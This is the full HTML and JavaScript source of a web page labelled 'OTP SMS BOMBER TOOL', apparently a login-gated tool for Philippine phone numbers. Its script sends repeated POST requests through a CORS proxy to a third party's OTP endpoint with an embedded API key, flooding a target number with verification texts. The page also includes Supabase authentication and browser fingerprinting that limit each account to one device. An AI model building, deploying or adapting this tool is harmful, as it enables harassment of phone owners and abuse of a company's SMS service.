<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>SEAN K [BOMBRTT]</title>

    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=Roboto+Flex:wght@300;500;700&display=swap" rel="stylesheet">

    <style>
    :root{
      --neon-purple:#8B00FF; --vibrant-pink:#FF00FF; --ice-blue:#00FFFF;
      --dark-background-top:#6A0DAD; --dark-background-bottom:#B5179E;
      --card-base:rgba(50,5,50,.9); --card-glow:0 0 10px var(--vibrant-pink),0 0 25px rgba(255,0,255,.4);
      --input-dark:rgba(0,0,0,.5); --console-bg:#110011; --console-text:var(--ice-blue);
    }
    body{
      font-family:'Roboto Flex',sans-serif;
      background:linear-gradient(180deg,var(--dark-background-top),var(--dark-background-bottom));
      color:#E0E0E0;min-height:100vh;display:flex;flex-direction:column;
      align-items:center;justify-content:flex-start;padding:60px 20px 40px;
      position:relative;overflow-x:hidden
    }
    .primary-font-bold{font-family:'Inter',sans-serif;font-weight:700;text-transform:uppercase}
    .main-logo-img{position:relative;width:100%;max-width:300px;height:auto;margin-bottom:0;
      filter:drop-shadow(0 0 12px var(--vibrant-pink)) drop-shadow(0 0 18px var(--neon-purple));
      z-index:15;pointer-events:none}
    .lip-graphic-img{position:absolute;bottom:-8vh;left:-10vw;width:clamp(180px,30vw,350px);
      height:auto;transform:rotate(-15deg);opacity:.9;filter:drop-shadow(0 0 10px rgba(255,0,255,.7));z-index:5}
    .cyber-card{width:100%;max-width:340px;margin-top:-50px;background-color:var(--card-base);
      border-radius:2rem;padding:2rem 1.25rem 1.5rem;box-shadow:var(--card-glow),
      inset 0 0 10px rgba(255,255,255,.2);border:2px solid var(--vibrant-pink);
      backdrop-filter:blur(5px);z-index:10;display:flex;flex-direction:column;min-height:450px}
    .cyber-console{background-color:var(--console-bg);border:1px solid var(--console-text);
      padding:.75rem;height:200px;overflow-y:auto;margin-top:1.5rem;border-radius:.5rem;
      box-shadow:inset 0 0 10px rgba(0,255,255,.3);font-size:.75rem;color:var(--console-text);
      white-space:pre-wrap;line-height:1.3}
    .cyber-button{height:36px;padding:0 14px;border-radius:8px;font-weight:700;cursor:pointer;
      transition:.2s;display:flex;align-items:center;justify-content:center;
      line-height:1;max-width:110px;box-shadow:0 0 3px rgba(0,255,0,.4);
      font-size:1.1em;font-family:'Inter',sans-serif}
    .cyber-button.start-mode{background-color:#00B300;color:#000}
    .cyber-button.stop-mode{background-color:#CC0000;color:#fff;
      box-shadow:0 0 5px rgba(255,0,0,.5),0 0 10px rgba(255,0,0,.2)}
    .cyber-input-group-phone{display:flex;width:100%;margin-bottom:1rem;border-radius:.5rem;
      border:1px solid var(--vibrant-pink);background-color:var(--input-dark);
      box-shadow:0 0 5px rgba(255,0,255,.5);transition:box-shadow .2s ease}
    .cyber-input-group-phone:focus-within{box-shadow:0 0 8px var(--vibrant-pink),
      0 0 15px rgba(255,0,255,.3)}
    .input-label-box{padding:.6rem .5rem .6rem 1rem;background-color:rgba(255,255,255,.1);
      color:var(--vibrant-pink);border-right:1px solid var(--vibrant-pink);
      font-family:'Inter',sans-serif;font-size:1rem;opacity:.8;border-top-left-radius:.5rem;
      border-bottom-left-radius:.5rem;display:flex;align-items:center;white-space:nowrap}
    .cyber-input-minimal{width:100%;padding:.6rem 1rem;background-color:var(--input-dark);
      color:#fff;font-size:.9rem;border:1px solid var(--vibrant-pink);
      box-shadow:0 0 5px rgba(255,0,255,.5);border-radius:.5rem;opacity:.8;
      transition:opacity .2s, box-shadow .2s;margin-bottom:1rem}
    .cyber-input-minimal:focus{opacity:1;box-shadow:0 0 8px var(--vibrant-pink),
      0 0 15px rgba(255,0,255,.3)}
    .cyber-input-phone-field{flex-grow:1;padding:.6rem 1rem;background:transparent;
      color:#fff;font-size:1.1rem;border:none;opacity:.5;transition:opacity .2s}
    .cyber-input-phone-field:focus{opacity:1}
    .user-info-text-primary{font-size:.8rem;font-weight:bold;text-shadow:0 0 5px var(--vibrant-pink)}
    .user-info-text-secondary{font-size:.7rem;color:#CCC}
    .modal{position:fixed;inset:0;display:none;place-items:center;z-index:30;
      background:rgba(0,0,0,.6);backdrop-filter:blur(6px)}
    .modal-card{width:min(92vw,720px);background:#1a0f1f;border:1px solid #ff00ff66;
      border-radius:16px;box-shadow:0 20px 70px rgba(0,0,0,.6);padding:14px}
    </style>
  </head>

  <body>
    <img src="https://i.postimg.cc/52D6YS8b/334631ae-faf9-4c44-9906732bfe6ff7-converted.png"
         alt="Top Logo" class="main-logo-img">

    <!-- === Top-left sticker / profile === -->
  <a href="https://t.me/YosiPagkataposMagIyot" target="_blank"
     class="absolute top-4 left-4 flex items-center space-x-2 z-20 cursor-pointer hover:opacity-90 transition duration-150">
    <img src="https://i.postimg.cc/8CWshfb7/b6509ebb-35f2-41c5-8068-9492ce2a4418-converted.png"
         onerror="this.src='https://placehold.co/40x40/FF00FF/000000?text=P'"
         alt="Built by Avatar"
         class="w-10 h-10 rounded-full border-2 border-white/50 shadow-lg profile-avatar-img object-cover">
    <div class="font-semibold leading-tight">
      <span class="block user-info-text-secondary">Built by</span>
      <span class="block text-white user-info-text-primary">Sean OneK</span>
    </div>
  </a>

  <!-- === Bottom-left lips sticker === -->
  <img src="https://i.postimg.cc/zG4VbFTB/1000121299-removebg-preview.png"
       onerror="this.src='https://placehold.co/300x250/FF69B4/FFFFFF/png?text=LIPS'"
       alt="Kiss Graphic" class="lip-graphic-img">


    <div class="absolute top-4 right-4 text-right z-20">
      <div class="text-sm font-bold text-white flex items-center justify-end space-x-2 primary-font-bold">
        <svg class="w-5 h-5 text-white/80" fill="currentColor" viewBox="0 0 20 20">
          <path fill-rule="evenodd"
            d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-6-3a2 2 0 11-4 0 2 2 0 014 0zm-2 4a5 5 0 00-4.546 2.916A5.98 5.98 0 0010 16a5.979 5.979 0 004.546-2.084A5 5 0 0010 11z"
            clip-rule="evenodd"></path>
        </svg>
        <span id="topEmail" class="text-white/90 user-info-text-primary">...</span>
        <button id="signOutBtn" class="ml-2 px-3 py-1 rounded bg-pink-600/80 hover:bg-pink-500 text-white text-xs">
          Sign out
        </button>
      </div>
      <p class="mt-0 user-info-text-secondary">
        <button id="openDevices" class="underline">Devices</button>
      </p>
    </div>

    <div class="cyber-card">
      <h3 class="text-xl font-bold mb-4 text-center text-white primary-font-bold"
          style="text-shadow:0 0 5px var(--vibrant-pink);">OTP SMS BOMBER TOOL</h3>

      <form id="otpForm">
        <div class="cyber-input-group-phone">
          <span class="input-label-box w-1/4">+63</span>
          <input type="tel" id="phoneNumberInput" placeholder="Phone Number"
                 class="cyber-input-phone-field" inputmode="numeric" maxlength="11">
        </div>
        <input type="number" id="amountInput" placeholder="Amount" min="1" max="5"
               class="cyber-input-minimal">
        <input type="number" id="delayInput" placeholder="Time Delay (seconds)" min="1"
               class="cyber-input-minimal">
      </form>

      <div class="flex justify-center mt-2 mb-4">
        <button id="toggleButton" type="button"
                class="cyber-button start-mode w-full primary-font-bold text-base">START</button>
      </div>

      <div id="response-console" class="cyber-console">SYSTEM: Ready.</div>
    </div>

    <!-- Devices Modal -->
    <div id="devicesModal" class="modal">
      <div class="modal-card">
        <div class="flex items-center justify-between mb-2">
          <strong class="text-white">Devices</strong>
          <button id="closeDevices" class="px-3 py-1 rounded bg-pink-600/80 hover:bg-pink-500 text-white text-xs">Close</button>
        </div>
        <div id="devicesInfo" class="text-sm opacity-90 mb-2"></div>
        <div id="devicesList" class="grid gap-2"></div>
      </div>
    </div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script>
  /*Supabase*/
  const SUPABASE_URL = "https://tezrwqrawrqtkxoydfec.supabase.co";
  const SUPABASE_ANON_KEY =
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRlenJ3cXJhd3JxdGt4b3lkZmVjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjI0MDU2NjAsImV4cCI6MjA3Nzk4MTY2MH0.jkBXZfx8_EEGcSbmjc1vWna2QZFtjIIhe52B2nS5OqA";
  const MAX_DEVICES = 1;
  const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

  /*Auth & Device*/
  let currentUser = null;
  (async () => {
    const { data } = await supabase.auth.getSession();
    if (!data.session) {
      window.location.href = "login.html";
      return;
    }
    currentUser = data.session.user;
    document.getElementById("topEmail").textContent = currentUser.email || "Signed in";
    try {
      await upsertCurrentDevice(currentUser.id);
    } catch (err) {
      alert("⚠️ You’ve reached the maximum number of devices. Please remove one first.");
    }
  })();
  document.getElementById("signOutBtn").onclick = async () => {
    await supabase.auth.signOut();
    window.location.href = "login.html";
  };

  /*  Device Management */
  function getOrCreateDeviceId() {
    let id = localStorage.getItem("device_id");
    if (!id) {
      id = crypto.randomUUID();
      localStorage.setItem("device_id", id);
    }
    return id;
  }
  async function sha256(t) {
    const e = new TextEncoder().encode(t);
    const b = await crypto.subtle.digest("SHA-256", e);
    return [...new Uint8Array(b)].map(x => x.toString(16).padStart(2,"0")).join("");
  }
  async function getFingerprint() {
    const raw = [
      navigator.userAgent,
      navigator.platform,
      navigator.language,
      screen.width + "x" + screen.height,
      screen.colorDepth,
    ].join("|");
    return sha256(raw);
  }
  async function upsertCurrentDevice(userId) {
    const device_id = getOrCreateDeviceId();
    const fp = await getFingerprint();
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const { error } = await supabase
      .from("user_devices")
      .upsert({
        user_id: userId,
        device_id,
        fingerprint: fp,
        ua,
        platform,
        last_seen: new Date().toISOString(),
      }, { onConflict: "user_id,device_id" });
    if (error) throw error;
  }
  async function listDevices(userId) {
    const { data, error } = await supabase.from("user_devices")
      .select("*").eq("user_id", userId)
      .order("last_seen", { ascending: false });
    if (error) throw error;
    return data || [];
  }
  async function deleteDevice(id) {
    const { error } = await supabase.from("user_devices").delete().eq("id", id);
    if (error) throw error;
  }

  /* Modal*/
  const openDevices = document.getElementById("openDevices");
  const devicesModal = document.getElementById("devicesModal");
  const closeDevices = document.getElementById("closeDevices");
  const devicesList = document.getElementById("devicesList");
  const devicesInfo = document.getElementById("devicesInfo");

  openDevices.onclick = async () => {
    const items = await listDevices(currentUser.id);
    const thisId = localStorage.getItem("device_id");
    devicesInfo.textContent = `Using ${items.length} / ${MAX_DEVICES} devices.`;
    devicesList.innerHTML = "";
    for (const dev of items) {
      const isThis = dev.device_id === thisId;
      const row = document.createElement("div");
      row.className = "flex justify-between items-start p-2 border border-pink-500/40 bg-fuchsia-900/20 rounded";
      row.innerHTML = `
        <div>
          <div class="font-bold">${isThis ? "This device" : dev.nickname || "Unnamed"}</div>
          <div class="opacity-70">${dev.platform || "?"} – ${(dev.ua || "").slice(0, 60)}</div>
          <div class="opacity-60 text-xs">Last seen: ${new Date(dev.last_seen).toLocaleString()}</div>
        </div>
        <div>
          <!-- remove buttons hidden for normal users -->
        </div>`;
      devicesList.appendChild(row);
    }
    devicesModal.style.display = "grid";
  };
  closeDevices.onclick = () => (devicesModal.style.display = "none");
  devicesList.addEventListener("click", async (e) => {
    const btn = e.target.closest("button");
    if (!btn) return;
    const id = btn.dataset.id;
    if (btn.dataset.action === "remove") {
      if (!confirm("Remove this device?")) return;
      await deleteDevice(id);
      openDevices.click();
    }
  });

  /*Sending Logic*/
  const DEMO_MODE = true;
  const USE_CORS_PROXY = true;
  const CORS_PROXY = "https://corsproxy.io/?url=";
  const DIRECT_ENDPOINT = "https://api.s5.com/player/api/v1/otp/request";
  const API_KEY = "d6a6d988-e73e-4402-8e52-6df554cbfb35";
  const MAX_ALLOWED = 1000000;
  const FETCH_TIMEOUT_MS = 15000;

  const toggleButton = document.getElementById("toggleButton");
  const responseConsole = document.getElementById("response-console");
  const phoneNumberInput = document.getElementById("phoneNumberInput");
  const amountInput = document.getElementById("amountInput");
  const delayInput = document.getElementById("delayInput");

  let isRunning = false, aborter = null, logQueue = [], rafId = null;
  function flushLogs(){
    if(!logQueue.length){rafId=null;return;}
    responseConsole.textContent += (responseConsole.textContent?"\n":"")+logQueue.join("\n");
    responseConsole.scrollTop=responseConsole.scrollHeight;
    logQueue.length=0;rafId=null;
  }
  function logToConsole(msg,clear=false){
    if(clear){responseConsole.textContent=msg;responseConsole.scrollTop=responseConsole.scrollHeight;logQueue.length=0;if(rafId){cancelAnimationFrame(rafId);rafId=null;}return;}
    logQueue.push(msg);if(!rafId)rafId=requestAnimationFrame(flushLogs);
  }
  function normalizePH(local){
    let n=String(local||"").replace(/\D/g,"");if(n.startsWith("0"))n=n.slice(1);
    return `+63${n}`;
  }
  function delay(ms,signal){return new Promise((res,rej)=>{const id=setTimeout(res,ms);if(signal)signal.addEventListener("abort",()=>{clearTimeout(id);rej(new DOMException("Aborted","AbortError"));},{once:true});});}
  const buildUrl=()=>USE_CORS_PROXY?`${CORS_PROXY}${encodeURIComponent(DIRECT_ENDPOINT)}`:DIRECT_ENDPOINT;

  async function sendOnceLive({phone,signal}){
    const controller=new AbortController();
    const timeout=setTimeout(()=>controller.abort(),FETCH_TIMEOUT_MS);
    if(signal)signal.addEventListener("abort",()=>controller.abort(),{once:true});
    try{
      const res=await fetch(buildUrl(),{
        method:"POST",
        mode:"cors",
        headers:{
          "Accept":"application/json, text/plain, */*",
          "Content-Type":"application/json",
          "x-public-api-key":API_KEY,
        },
        body:JSON.stringify({phone_number:phone}),
        signal:controller.signal,
      });
      const text=await res.text();
      return {ok:res.ok,status:res.status,text};
    }finally{clearTimeout(timeout);}
  }

  /* Cooldown*/
  const cooldownWrap=document.createElement("div");
  cooldownWrap.className="mt-2 text-sm hidden";
  cooldownWrap.innerHTML=`<span class="opacity-80">Cooldown:</span> <span id="cooldownTime" class="font-bold text-pink-400">00:00</span>`;
  const cooldownTime=cooldownWrap.querySelector("#cooldownTime");
  if(responseConsole&&responseConsole.parentNode)responseConsole.parentNode.insertBefore(cooldownWrap,responseConsole);

  let cooldownTimerId=null;
  function fmtMMSS(t){t=Math.max(0,Math.floor(t));const m=Math.floor(t/60),s=t%60;return `${String(m).padStart(2,"0")}:${String(s).padStart(2,"0")}`;}
  function startCooldown(sec){
    clearInterval(cooldownTimerId);
    const endAt=Date.now()+sec*1000;
    localStorage.setItem("cooldown_end",endAt.toString());
    cooldownWrap.classList.remove("hidden");
    toggleButton.disabled=true;
    function tick(){
      const r=Math.ceil((endAt-Date.now())/1000);
      if(r<=0){
        cooldownTime.textContent="00:00";
        cooldownWrap.classList.add("hidden");
        toggleButton.disabled=false;
        clearInterval(cooldownTimerId);
        localStorage.removeItem("cooldown_end");
        alert("Cooldown complete! You can send again.");
        return;
      }
      cooldownTime.textContent=fmtMMSS(r);
    }
    tick();cooldownTimerId=setInterval(tick,1000);
  }
  const storedCooldown=localStorage.getItem("cooldown_end");
  if(storedCooldown&&parseInt(storedCooldown)>Date.now()){
    const remain=Math.ceil((parseInt(storedCooldown)-Date.now())/1000);
    startCooldown(remain);
  }

  toggleButton.addEventListener("click",async e=>{
    e.preventDefault();
    if(toggleButton.disabled){logToConsole("⚠️ Still cooling down.",true);return;}
    if(isRunning){aborter?.abort();isRunning=false;toggleButton.textContent="START";logToConsole("Cancelled.");return;}
    const raw=phoneNumberInput.value.trim(),digits=raw.replace(/\D/g,"");
    if(digits.length<9){logToConsole("Invalid phone number",true);return;}
    const count=Math.min(Math.max(1,parseInt(amountInput.value||"1",10)),MAX_ALLOWED);
    const delaySec=parseInt(delayInput.value||"3",10);
    const phone=normalizePH(raw);
    isRunning=true;aborter=new AbortController();toggleButton.textContent="STOP";
    logToConsole("RUNNING...",true);
    logToConsole(`Target: ${phone}`);logToConsole(`Amount: ${count}`);logToConsole(`Delay: ${delaySec}s`);
    for(let i=1;i<=count;i++){
      if(aborter.signal.aborted)break;
      logToConsole(`\n[${i}/${count}] Sending...`);
      const res=await sendOnceLive({phone,signal:aborter.signal});
      logToConsole(res.ok?`✅ Sent (${res.status})`:`❌ Failed (${res.status})`);
      if(i!==count)await delay(delaySec*1000,aborter.signal);
    }
    isRunning=false;toggleButton.textContent="START";
    const secs=180+Math.floor(Math.random()*721);
    logToConsole(`Cooldown started (${Math.round(secs/60)} min).`);
    startCooldown(secs);
  });

  window.addEventListener("DOMContentLoaded",()=>logToConsole("SYSTEM: Ready.",true));
  </script>
  </body>
  </html>
